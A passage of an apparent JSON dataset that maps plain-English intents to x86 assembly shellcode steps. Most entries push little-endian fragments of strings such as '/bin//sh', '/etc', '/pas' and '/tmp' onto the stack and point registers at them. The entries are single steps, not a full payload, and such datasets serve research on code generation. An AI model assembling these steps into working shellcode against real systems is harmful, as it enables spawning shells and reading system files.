      "ASCII /bin/sh": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move /bin/sh into the edx register",
    "rewritten_intent": "move /bin/sh into the edx register",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov edx, esp",
    "slot_map": {
      "move /bin/sh": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the 0x68732f6e onto the stack",
    "rewritten_intent": "push the 0x68732f6e onto the stack",
    "snippet": "push 0x68732f6e",
    "slot_map": {
      "0x68732f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x68732f6e to the stack",
    "rewritten_intent": "push 0x68732f6e to the stack",
    "snippet": "push 0x68732f6e",
    "slot_map": {
      "0x68732f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x68732f6e onto the stack",
    "rewritten_intent": "push 0x68732f6e onto the stack",
    "snippet": "push 0x68732f6e",
    "slot_map": {
      "0x68732f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x68735858 onto the stack",
    "rewritten_intent": "push the value 0x68735858 onto the stack",
    "snippet": "push 0x68735858",
    "slot_map": {
      "0x68735858": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x68736162 to the stack",
    "rewritten_intent": "push 0x68736162 to the stack",
    "snippet": "push 0x68736162",
    "slot_map": {
      "0x68736162": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x68736162 onto the stack",
    "rewritten_intent": "push 0x68736162 onto the stack",
    "snippet": "push 0x68736162",
    "slot_map": {
      "0x68736162": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x68736164 to the stack",
    "rewritten_intent": "push 0x68736164 to the stack",
    "snippet": "push 0x68736164",
    "slot_map": {
      "0x68736164": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x68736164 onto the stack",
    "rewritten_intent": "push 0x68736164 onto the stack",
    "snippet": "push 0x68736164",
    "slot_map": {
      "0x68736164": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6873732f onto the stack",
    "rewritten_intent": "push the value 0x6873732f onto the stack",
    "snippet": "push 0x6873732f",
    "slot_map": {
      "0x6873732f": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register",
    "snippet": "push 0x6873732f \\n push 0x6374652f \\n mov eax, esp",
    "slot_map": {
      "0x6873732f": "var0",
      "0x6374652f": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x6873732f \\n push 0x6374652f \\n mov ebx, esp",
    "slot_map": {
      "0x6873732f": "var0",
      "0x6374652f": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register",
    "snippet": "push 0x6873732f \\n push 0x6374652f \\n mov ecx, esp",
    "slot_map": {
      "0x6873732f": "var0",
      "0x6374652f": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register",
    "snippet": "push 0x6873732f \\n push 0x6374652f \\n mov edi, esp",
    "slot_map": {
      "0x6873732f": "var0",
      "0x6374652f": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register",
    "snippet": "push 0x6873732f \\n push 0x6374652f \\n mov edx, esp",
    "slot_map": {
      "0x6873732f": "var0",
      "0x6374652f": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register",
    "snippet": "push 0x6873732f \\n push 0x6374652f \\n mov esi, esp",
    "slot_map": {
      "0x6873732f": "var0",
      "0x6374652f": "var1",
      "esi": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 0x68737a2f onto the stack",
    "rewritten_intent": "push 0x68737a2f onto the stack",
    "snippet": "push 0x68737a2f",
    "slot_map": {
      "0x68737a2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x69616863 onto the stack",
    "rewritten_intent": "push the 0x69616863 onto the stack",
    "snippet": "push 0x69616863",
    "slot_map": {
      "0x69616863": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x69622f2f onto the stack",
    "rewritten_intent": "push the 0x69622f2f onto the stack",
    "snippet": "push 0x69622f2f",
    "slot_map": {
      "0x69622f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x69622f2f to the stack",
    "rewritten_intent": "push 0x69622f2f to the stack",
    "snippet": "push 0x69622f2f",
    "slot_map": {
      "0x69622f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x69622f2f onto the stack",
    "rewritten_intent": "push 0x69622f2f onto the stack",
    "snippet": "push 0x69622f2f",
    "slot_map": {
      "0x69622f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x69622f2f onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the value 0x69622f2f onto the stack and point the eax register to the stack register",
    "snippet": "push 0x69622f2f \\n mov eax, esp",
    "slot_map": {
      "0x69622f2f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x69622f2f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x69622f2f onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x69622f2f \\n mov ebx, esp",
    "slot_map": {
      "0x69622f2f": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x69622f2f onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the value 0x69622f2f onto the stack and point the ecx register to the stack register",
    "snippet": "push 0x69622f2f \\n mov ecx, esp",
    "slot_map": {
      "0x69622f2f": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x69622f2f onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the value 0x69622f2f onto the stack and point the edx register to the stack register",
    "snippet": "push 0x69622f2f \\n mov edx, esp",
    "slot_map": {
      "0x69622f2f": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 0x69622f3a onto the stack",
    "rewritten_intent": "push 0x69622f3a onto the stack",
    "snippet": "push 0x69622f3a",
    "slot_map": {
      "0x69622f3a": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x69622f65 onto the stack",
    "rewritten_intent": "push 0x69622f65 onto the stack",
    "snippet": "push 0x69622f65",
    "slot_map": {
      "0x69622f65": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x69622f65 to the stack",
    "rewritten_intent": "push 0x69622f65 to the stack",
    "snippet": "push 0x69622f65",
    "slot_map": {
      "0x69622f65": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x69622f65 onto the stack",
    "rewritten_intent": "push the 0x69622f65 onto the stack",
    "snippet": "push 0x69622f65",
    "slot_map": {
      "0x69622f65": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6962732f onto the stack",
    "rewritten_intent": "push 0x6962732f onto the stack",
    "snippet": "push 0x6962732f",
    "slot_map": {
      "0x6962732f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x6962732f onto the stack",
    "rewritten_intent": "push the 0x6962732f onto the stack",
    "snippet": "push 0x6962732f",
    "slot_map": {
      "0x6962732f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6c626174 onto the stack",
    "rewritten_intent": "push 0x6c626174 onto the stack",
    "snippet": "push 0x6c626174",
    "slot_map": {
      "0x6c626174": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x6d722f2f onto the stack",
    "rewritten_intent": "push the 0x6d722f2f onto the stack",
    "snippet": "push 0x6d722f2f",
    "slot_map": {
      "0x6d722f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6d726574 onto the stack",
    "rewritten_intent": "push 0x6d726574 onto the stack",
    "snippet": "push 0x6d726574",
    "slot_map": {
      "0x6d726574": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6d726574 to the stack",
    "rewritten_intent": "push 0x6d726574 to the stack",
    "snippet": "push 0x6d726574",
    "slot_map": {
      "0x6d726574": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x6e onto the stack",
    "rewritten_intent": "push the 0x6e onto the stack",
    "snippet": "push 0x6e",
    "slot_map": {
      "0x6e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push /bin to the stack",
    "rewritten_intent": "push /bin to the stack",
    "snippet": "push 0x6e69622f",
    "slot_map": {
      "push /bin": "var0"
    },
    "intent_tokens": [
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "0x6e69622f"
    ]
  },
  {
    "intent": "push 0x6e69622f onto the stack",
    "rewritten_intent": "push 0x6e69622f onto the stack",
    "snippet": "push 0x6e69622f",
    "slot_map": {
      "0x6e69622f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push ascii nib/ onto stack",
    "rewritten_intent": "push ascii nib/ onto stack",
    "snippet": "push 0x6e69622f",
    "slot_map": {
      "nib/ onto": "var0"
    },
    "intent_tokens": [
      "push",
      "ascii",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "0x6e69622f"
    ]
  },
  {
    "intent": "push nib/",
    "rewritten_intent": "push nib/",
    "snippet": "push 0x6e69622f",
    "slot_map": {
      "nib/": "var0"
    },
    "intent_tokens": [
      "push",
      "var0"
    ],
    "snippet_tokens": [
      "push",
      "0x6e69622f"
    ]
  },
  {
    "intent": "push the 0x6e69622f onto the stack",
    "rewritten_intent": "push the 0x6e69622f onto the stack",
    "snippet": "push 0x6e69622f",
    "slot_map": {
      "0x6e69622f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6e69622f onto the stack",
    "rewritten_intent": "push the value 0x6e69622f onto the stack",
    "snippet": "push 0x6e69622f",
    "slot_map": {
      "0x6e69622f": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register",
    "snippet": "push 0x6e69622f \\n push 0x7273752f \\n mov eax, esp",
    "slot_map": {
      "0x6e69622f": "var0",
      "0x7273752f": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x6e69622f \\n push 0x7273752f \\n mov ebx, esp",
    "slot_map": {
      "0x6e69622f": "var0",
      "0x7273752f": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register",
    "snippet": "push 0x6e69622f \\n push 0x7273752f \\n mov ecx, esp",
    "slot_map": {
      "0x6e69622f": "var0",
      "0x7273752f": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register",
    "snippet": "push 0x6e69622f \\n push 0x7273752f \\n mov edx, esp",
    "slot_map": {
      "0x6e69622f": "var0",
      "0x7273752f": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the 0x6e776f64 onto the stack",
    "rewritten_intent": "push the 0x6e776f64 onto the stack",
    "snippet": "push 0x6e776f64",
    "slot_map": {
      "0x6e776f64": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6e7a762d onto the stack",
    "rewritten_intent": "push 0x6e7a762d onto the stack",
    "snippet": "push 0x6e7a762d",
    "slot_map": {
      "0x6e7a762d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6e7a762d onto the stack and point the ebp register to the stack register",
    "rewritten_intent": "push the value 0x6e7a762d onto the stack and point the ebp register to the stack register",
    "snippet": "push 0x6e7a762d \\n mov ebp, esp",
    "slot_map": {
      "0x6e7a762d": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6e7a762d onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x6e7a762d onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x6e7a762d \\n mov ebx, esp",
    "slot_map": {
      "0x6e7a762d": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6e7a762d onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push the value 0x6e7a762d onto the stack and point the edi register to the stack register",
    "snippet": "push 0x6e7a762d \\n mov edi, esp",
    "slot_map": {
      "0x6e7a762d": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6e7a762d onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push the value 0x6e7a762d onto the stack and point the esi register to the stack register",
    "snippet": "push 0x6e7a762d \\n mov esi, esp",
    "slot_map": {
      "0x6e7a762d": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 0x6f635f64 onto the stack",
    "rewritten_intent": "push 0x6f635f64 onto the stack",
    "snippet": "push 0x6f635f64",
    "slot_map": {
      "0x6f635f64": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6f723a30 onto the stack",
    "rewritten_intent": "push 0x6f723a30 onto the stack",
    "snippet": "push 0x6f723a30",
    "slot_map": {
      "0x6f723a30": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x7 onto the stack and point edx to the stack register",
    "rewritten_intent": "push the value 0x7 onto the stack and point edx to the stack register",
    "snippet": "push 0x7 \\n mov edx, esp",
    "slot_map": {
      "0x7": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 0x70692f6e onto the stack",
    "rewritten_intent": "push 0x70692f6e onto the stack",
    "snippet": "push 0x70692f6e",
    "slot_map": {
      "0x70692f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x70692f6e onto the stack",
    "rewritten_intent": "push the 0x70692f6e onto the stack",
    "snippet": "push 0x70692f6e",
    "slot_map": {
      "0x70692f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x706d742f onto the stack",
    "rewritten_intent": "push 0x706d742f onto the stack",
    "snippet": "push 0x706d742f",
    "slot_map": {
      "0x706d742f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x706d742f to the stack",
    "rewritten_intent": "push 0x706d742f to the stack",
    "snippet": "push 0x706d742f",
    "slot_map": {
      "0x706d742f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x706d742f onto the stack",
    "rewritten_intent": "push the 0x706d742f onto the stack",
    "snippet": "push 0x706d742f",
    "slot_map": {
      "0x706d742f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7268732f onto the stack",
    "rewritten_intent": "push 0x7268732f onto the stack",
    "snippet": "push 0x7268732f",
    "slot_map": {
      "0x7268732f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x72706475 onto the stack",
    "rewritten_intent": "push 0x72706475 onto the stack",
    "snippet": "push 0x72706475",
    "slot_map": {
      "0x72706475": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7273752f onto the stack",
    "rewritten_intent": "push 0x7273752f onto the stack",
    "snippet": "push 0x7273752f",
    "slot_map": {
      "0x7273752f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7273752f to the stack",
    "rewritten_intent": "push 0x7273752f to the stack",
    "snippet": "push 0x7273752f",
    "slot_map": {
      "0x7273752f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7361702f to the stack",
    "rewritten_intent": "push 0x7361702f to the stack",
    "snippet": "push 0x7361702f",
    "slot_map": {
      "0x7361702f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7361702f onto the stack",
    "rewritten_intent": "push 0x7361702f onto the stack",
    "snippet": "push 0x7361702f",
    "slot_map": {
      "0x7361702f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x73644d24 onto the stack",
    "rewritten_intent": "push 0x73644d24 onto the stack",
    "snippet": "push 0x73644d24",
    "slot_map": {
      "0x73644d24": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7369642d to the stack",
    "rewritten_intent": "push 0x7369642d to the stack",
    "snippet": "push 0x7369642d",
    "slot_map": {
      "0x7369642d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7369642d onto the stack",
    "rewritten_intent": "push 0x7369642d onto the stack",
    "snippet": "push 0x7369642d",
    "slot_map": {
      "0x7369642d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x7372656f onto the stack",
    "rewritten_intent": "push the 0x7372656f onto the stack",
    "snippet": "push 0x7372656f",
    "slot_map": {
      "0x7372656f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7372656f to the stack",
    "rewritten_intent": "push 0x7372656f to the stack",
    "snippet": "push 0x7372656f",
    "slot_map": {
      "0x7372656f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7372656f onto the stack",
    "rewritten_intent": "push 0x7372656f onto the stack",
    "snippet": "push 0x7372656f",
    "slot_map": {
      "0x7372656f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7374736f onto the stack",
    "rewritten_intent": "push 0x7374736f onto the stack",
    "snippet": "push 0x7374736f",
    "slot_map": {
      "0x7374736f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x7374736f onto the stack",
    "rewritten_intent": "push the 0x7374736f onto the stack",
    "snippet": "push 0x7374736f",
    "slot_map": {
      "0x7374736f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x74 onto the stack",
    "rewritten_intent": "push 0x74 onto the stack",
    "snippet": "push 0x74",
    "slot_map": {
      "0x74": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x74 to the stack",
